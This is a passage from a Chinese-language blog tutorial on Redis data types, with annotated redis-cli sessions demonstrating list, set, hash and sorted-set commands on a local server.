class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;a&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list2 a b c <span class="comment"># 将一个或者多个值插入列表尾部（右）</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list2 0 -1</span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;c&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rrange list 0 -1 <span class="comment"># 没有rrange这个命令哦</span></span><br><span class="line">(error) ERR unknown <span class="built_in">command</span> <span class="string">&#x27;rrange&#x27;</span>, with args beginning with: <span class="string">&#x27;list&#x27;</span> <span class="string">&#x27;0&#x27;</span> <span class="string">&#x27;-1&#x27;</span> </span><br><span class="line">127.0.0.1:6379&gt; lpop list  <span class="comment"># 移除list第一个元素</span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1 <span class="comment">#移除list最后一个元素</span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpop list </span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list</span><br><span class="line">(error) ERR wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;lrange&#x27;</span> <span class="built_in">command</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lindex list 0 <span class="comment"># 通过下标获得 list 中的某一个值！</span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lindex list 5</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; lindex list 3</span><br><span class="line"><span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; clear</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; llen list <span class="comment"># 返回列表长度</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrem list 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 2 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; lpush list 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 1 2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 2 1 <span class="comment"># 移除list集合中指定个数的value，精确匹配</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; ltrim list 1 2 <span class="comment"># 通过下标截取指定的长度，这个list已经被改变了，截断了 只剩下截取的元素！</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpoplpush list list2 <span class="comment"># 移除列表的最后一个元素，将他移动到新的列表的头部！</span></span><br><span class="line"><span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list2 0 -1</span><br><span class="line">1) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; exists list <span class="comment"># 判断列表是否存在，返回1就是存在， 返回0就是不存在</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists list2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; lset list 0 a <span class="comment"># 替换这个下面对应的值</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lset list2 0 a <span class="comment"># 替换时，列表不存在报这个错误</span></span><br><span class="line">(error) ERR no such key</span><br><span class="line">127.0.0.1:6379&gt; lset list 4 a</span><br><span class="line">(error) ERR index out of range <span class="comment"># 替换时，下标越界报这个错误</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; flushdb</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; linsert list before 1 0 <span class="comment"># 将某个具体的value插入到列把你中某个元素的前面或者后面！</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;0&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; linsert list after 4 5</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;0&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">6) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>小结</p>
</blockquote>
<ul>
<li>他实际上是一个链表，before Node after ， left，right 都可以插入值</li>
<li>如果key 不存在，创建新的链表</li>
<li>如果key存在，新增内容</li>
<li>如果移除了所有值，空链表，也代表不存在</li>
<li>在两边插入或者改动值，效率最高！ 中间元素，相对来说效率会低一点~</li>
</ul>
<p>消息队列（Lpush Rpop）</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/ce6a1c42a3b3c6be6148e81ac4cfe196--2f13--image-20240918193951067.png" alt="image-20240918193951067"></p>
<p>栈（ Lpush Lpop）</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/b456052fd61d13bc0061169663b6b004--1542--image-20240918193959804.png" alt="image-20240918193959804"></p>
<h2 id="4、Set集合"><a href="#4、Set集合" class="headerlink" title="4、Set集合"></a>4、Set集合</h2><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 1 2 3 4 <span class="comment"># 	set集合中添加元素</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1 <span class="comment"># 查看指定set的所有值</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sismember setkey1 1  <span class="comment"># 判断某一个值是不是在set集合中！ 返回1代表存在，返回0代表不存在</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; sismember setkey1 5</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 5</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 1 2 <span class="comment"># set集合不可添加重复的值</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; scard setkey1 <span class="comment"># 获取set集合中的内容元素个数！</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srem set1 1 <span class="comment"># 移除set集合中的指定元素</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; scard set1</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 <span class="comment"># 随机抽选出一个元素</span></span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 2 <span class="comment"># 随机抽选出指定个数的元素</span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 2</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 <span class="comment"># 随机删除一些set集合中的元素！</span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 </span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 2 <span class="comment"># 随机删除指定个数的元素</span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 </span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smove set1 set2 1 <span class="comment"># 将集合中的一个指定的值，移动到另外一个set集合！</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smembers set2</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; sadd set2 3 4 5 6</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smembers set2</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">3) <span class="string">&quot;5&quot;</span></span><br><span class="line">4) <span class="string">&quot;6&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sdiff set1 set2 <span class="comment"># 差集</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sinter set1 set2 <span class="comment"># 交集  通用好友就可以这样实现</span></span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sunion set1 set2 <span class="comment">#并集</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">6) <span class="string">&quot;6&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<h2 id="5、Hash（哈希）"><a href="#5、Hash（哈希）" class="headerlink" title="5、Hash（哈希）"></a>5、Hash（哈希）</h2><p>Redis hash 是一个 string 类型的 field（字段） 和 value（值） 的映射表，hash 特别适合用于存储对象。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; hset myhash1 f1 v1 <span class="comment"># set一个具体 key-vlaue</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hget myhash1 f1 <span class="comment"># 获取一个字段值</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hmset myhash2 f1 v1 f2 v2  <span class="comment"># set多个 key-vlaue</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;myhash2&quot;</span></span><br><span class="line">2) <span class="string">&quot;myhash1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hmget myhash2 f1 f2 <span class="comment"># 获取多个字段值</span></span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2 <span class="comment"># 获取全部的数据</span></span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hdel myhash2 f1 <span class="comment"># 删除hash指定key字段！对应的value值也就消失了！</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2</span><br><span class="line">1) <span class="string">&quot;f2&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v1 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hlen myhash1 <span class="comment"># 获取hash表的字段数量！</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v2 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hexists myhash1 f1 <span class="comment"># 判断hash中指定字段是否存在 返回1说明存在，返回0说明不存在</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hexists myhash1 f3</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v1 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hkeys myhash1 <span class="comment"># 只获得所有field</span></span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;f2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hvals myhash1 <span class="comment"># 只获得所有value</span></span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hset myhash1 f1 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 1 <span class="comment">#指定增量 自增</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 1</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 3</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 -1</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f1 v1 <span class="comment"># 如果field不存在，则设置成功，返回1</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f1 v11  <span class="comment">#如果field存在，则设置失败，返回1</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f2 v2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>hash变更的数据 user name age,尤其是是用户信息之类的，经常变动的信息！ </p>
<p>hash 更适合于对象的存储，String更加适合字符串存储！</p>
<h2 id="6、Zset（有序集合）"><a href="#6、Zset（有序集合）" class="headerlink" title="6、Zset（有序集合）"></a>6、Zset（有序集合）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 1 a  <span class="comment"># 添加一个值</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 2 b </span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 3 c 4 d <span class="comment"># 添加多个值</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; zrange myset 0 -1 <span class="comment"># 获取所有的值</span></span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;c&quot;</span></span><br><span class="line">4) <span class="string">&quot;d&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd salary 60 zhangsan</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd salary 80 lisi</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd salary 50 wangwu</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf +inf <span class="comment"># 显示全部的用户 从小到大！（-inf 代表负无穷  +inf代表正无穷）</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrevrange salary 0 -1 <span class="comment"># 从大大小排序</span></span><br><span class="line">1) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf +inf withscores <span class="comment">#从小到大显示所有的用户并附带薪资</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;50&quot;</span></span><br><span class="line">3) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">4) <span class="string">&quot;60&quot;</span></span><br><span class="line">5) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">6) <span class="string">&quot;80&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf 60 withscores <span class="comment"># 